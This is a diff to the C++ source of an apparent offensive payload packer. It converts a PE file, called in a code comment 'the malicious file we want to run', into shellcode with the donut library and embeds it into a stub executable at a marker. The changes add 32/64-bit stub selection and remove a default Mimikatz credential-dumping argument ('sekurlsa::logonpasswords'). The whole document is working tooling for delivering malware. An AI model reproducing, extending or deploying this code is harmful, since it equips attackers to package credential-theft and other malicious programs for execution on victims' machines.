@@ -6,16 +6,17 @@
 #include "donut.h"
 #include "tclap/CmdLine.h"
 #include "Helper.h"
-#include "RibeyeBone64.h"
-#include "RibeyeBone86.h"
 
+#ifdef _WIN64
 #pragma comment(lib, "donut.lib")
+#else
+#pragma comment(lib, "donut32.lib")
+#endif
+
 
 #define MAX_BUFFER 4097152
 // Struct that will determine the configuration to run this
 
-std::string payload_output = "";
-std::string params = "";
 
 struct Coconut
 {
@@ -34,8 +35,28 @@ struct Coconut
 } coconut;
 
 
+bool isValidHeader(char* payload)
+{
+	IMAGE_DOS_HEADER* lpDosHeader = (IMAGE_DOS_HEADER*)payload;
+
+	if (lpDosHeader->e_magic == IMAGE_DOS_SIGNATURE)
+	{
+		return true;
+	}
+	return false;
+}
+
+bool is64bit(char* payload)
+{
+	IMAGE_DOS_HEADER* lpDosHeader = (IMAGE_DOS_HEADER*)payload;
+
+	IMAGE_NT_HEADERS* lpNtHeader = reinterpret_cast<IMAGE_NT_HEADERS*>(payload + lpDosHeader->e_lfanew);
+
+	return (lpNtHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64);
+}
+
 // File is the malicious file we want to run
-int writeShellCode(const char * file)
+int writeShellCode(const char * file, std::string payload_output, std::string params)
 {
 	DONUT_CONFIG c;
 
@@ -58,11 +79,10 @@ int writeShellCode(const char * file)
 	memcpy(c.file, file, strlen(file));
 
 	char  * buffer = new char[MAX_BUFFER];
-	std::ifstream infile(file);
+	std::ifstream infile(file, std::ios::in | std::ios::binary | std::ios::ate);
 	//get length of file
-	infile.seekg(0, std::ios::end);
 	size_t length = infile.tellg();
-	infile.seekg(0, std::ios::beg);
+	infile.seekg(0);
 
 	// don't overflow the buffer!
 	if (length > MAX_BUFFER)
@@ -74,13 +94,29 @@ int writeShellCode(const char * file)
 	//read file
 	infile.read(buffer, length);
 
+	if (!isValidHeader(buffer))
+	{
+		printf("[!] Invalid PE file, abort!\n");
+	}
 	DonutCreate(&c);
 
 	coconut.szData = c.pic_len;
 
 	memcpy((void*)coconut.opcodes, c.pic, c.pic_len);
 
-	std::ifstream Bone("RibeyeBone.exe", std::ios::in | std::ios::binary);
+
+	std::ifstream Bone;
+
+	if (is64bit(buffer))
+	{
+		printf("[+] Detecting a 64bit payload.\n");
+		Bone.open("RibeyeBone64.exe", std::ios::in | std::ios::binary);
+	}
+	else
+	{
+		printf("[+] Detecting a 32bit payload.\n");
+		Bone.open("RibeyeBone32.exe", std::ios::in | std::ios::binary);
+	}
 
 	char* bone_buffer = new char[MAX_BUFFER];
 	//get length of file
@@ -104,11 +140,9 @@ int writeShellCode(const char * file)
 		return 1;
 	}
 
-	INT64 offset = (INT64)marker - (INT64)bone_buffer;
+	intptr_t offset = (intptr_t)marker - (intptr_t)bone_buffer;
 
-	printf("[+] Found coconutz marker at %p from %p [offset: %d] with string %s\n", marker, bone_buffer, offset, marker);
-
-	printf("[+] Size of coconut %d %p vs size of bone stud %d %p\n", sizeof coconut, sizeof coconut, bone_length, bone_length);
+	printf("[+] Found coconutz marker at %x from %x [offset: %d] with string %s\n", marker, (uintptr_t)bone_buffer, offset, marker);
 
 	memcpy(bone_buffer + offset, &coconut, sizeof(coconut));
 
@@ -138,7 +172,7 @@ int main(int argc, char** argv)
 
 		TCLAP::ValueArg<std::string> filepath("f", "file", "Path to file to execute", true, "C:\\Users\\Dev\\Desktop\\malware.exe", "string");
 		TCLAP::ValueArg<std::string> outputname("o", "output", "Output file name", true, "ribeye.exe", "string");
-		TCLAP::ValueArg<std::string> parameters("g", "param", "Parameter to pass to payload", true, "sekurlsa::logonpasswords", "string");
+		TCLAP::ValueArg<std::string> parameters("g", "param", "Parameter to pass to payload", false, "", "string");
 		TCLAP::ValueArg<int> sleeptime("t", "sleeptime", "How long to sleep for (in ms) if -s is enabled", false , 5000, "integer");
 
 		// Add the argument nameArg to the CmdLine object. The CmdLine object
@@ -160,6 +194,7 @@ int main(int argc, char** argv)
 
 		// Parse the argv array.
 		cmd.parse(argc, argv);
+
 
 		if (bAll.getValue())
 		{
@@ -187,13 +222,10 @@ int main(int argc, char** argv)
 
 		}
 
-		params = parameters.getValue();
-
 		std::string targetFile = filepath.getValue();
 
-		payload_output = outputname.getValue();
 
-		writeShellCode(targetFile.data());
+		writeShellCode(targetFile.data(), outputname.getValue(), parameters.getValue());
 
 	}
 	catch (TCLAP::ArgException &e)  // catch any exceptions
